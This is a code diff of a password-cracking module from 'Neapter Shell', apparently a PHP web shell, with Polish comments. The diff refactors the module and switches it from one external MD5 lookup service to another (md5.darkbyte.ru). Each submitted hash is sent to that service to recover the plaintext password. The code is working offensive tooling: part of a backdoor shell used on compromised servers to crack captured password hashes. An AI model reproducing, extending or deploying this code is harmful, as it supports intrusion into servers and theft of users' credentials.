@@ -4,41 +4,22 @@
  * Neapter Shell
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
  * @license   http://www.gnu.org/licenses/gpl-3.0.txt
  */
 
 /**
- * ModuleMd5crack - Lamanie hasy md5
- *
- * hashkiller.com - version f41a5cabc515e4d8b11e4aaee2b86a183f59136a
+ * Lamanie hasy md5
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Modules
  */
-class ModuleMd5crack implements ShellInterface
+class ModuleMd5crack extends ModuleAbstract
 {
-	/**
-	 * Obiekt Shell
-	 *
-	 * @access private
-	 * @var    object
-	 */
-	private $oShell;
-
-	/**
-	 * Konstruktor
-	 *
-	 * @access public
-	 * @param  object $oShell Obiekt Shell
-	 * @return void
-	 */
-	public function __construct( Shell $oShell )
-	{
-		$this -> oShell = $oShell;
-	}
-
 	/**
 	 * Dostepna lista komend
 	 *
@@ -61,7 +42,7 @@ class ModuleMd5crack implements ShellInterface
 		/**
 		 * Wersja Data Autor
 		 */
-		return '1.01 2011-10-06 - <krzotr@gmail.com>';
+		return '1.02 2012-11-10 - <krzotr@gmail.com>';
 	}
 
 	/**
@@ -94,40 +75,36 @@ DATA;
 		/**
 		 * Help
 		 */
-		if( $this -> oShell -> iArgc === 0 )
+		$iParams = $this -> oShell -> getArgs() -> getNumberOfParams();
+
+		if( $iParams === 0 )
 		{
 			return $this -> getHelp();
 		}
 
 		$sOutput = NULL;
-		for( $i = 0; $i < $this -> oShell -> iArgc; ++$i )
+		for( $i = 0; $i < $iParams; ++$i )
 		{
-			if( ! preg_match( '~^[a-zA-Z0-9]{32}\z~', $this -> oShell -> aArgv[ $i ] ) )
+			$sHash = $this -> oShell -> getArgs() -> getParam( $i );
+			if( ! preg_match( '~^[a-zA-Z0-9]{32}\z~', $sHash ) )
 			{
 				continue ;
 			}
 
-			$sOutput .= sprintf( '%s:', $this -> oShell -> aArgv[ $i ] );
-
 			/**
-			 * API hashkiller
+			 * API md5.darkbyte.ru
 			 */
-			$sData = file_get_contents( sprintf( 'http://www.tmto.org/api/latest/?hash=%s&auth=true' , $this -> oShell -> aArgv[ $i ] ) );
+			$sData = @ file_get_contents( 'http://md5.darkbyte.ru/api.php?q=' . $sHash );
 
+			$sOutput .= sprintf( "%s:%s\r\n", $sHash, ( trim( $sData ) ?: 'password-not-found' ) );
+		}
 
-			if( ( ( $oXml = simplexml_load_string( $sData ) ) !== FALSE ) && ( $oXml->result['text'] !== '' ))
-			{
-				/**
-				 * Odzyskany hash
-				 */
-				$sOutput .= (string) base64_decode( $oXml->result['text'] );
-			}
-			else
-			{
-				$sOutput .= 'password-not-found';
-			}
-
-			$sOutput .= "\r\n";
+		/**
+		 * Poprawny hash jest wymagany
+		 */
+		if( $sOutput === NULL )
+		{
+			return $this -> getHelp();
 		}
 
 		return htmlspecialchars( $sOutput );
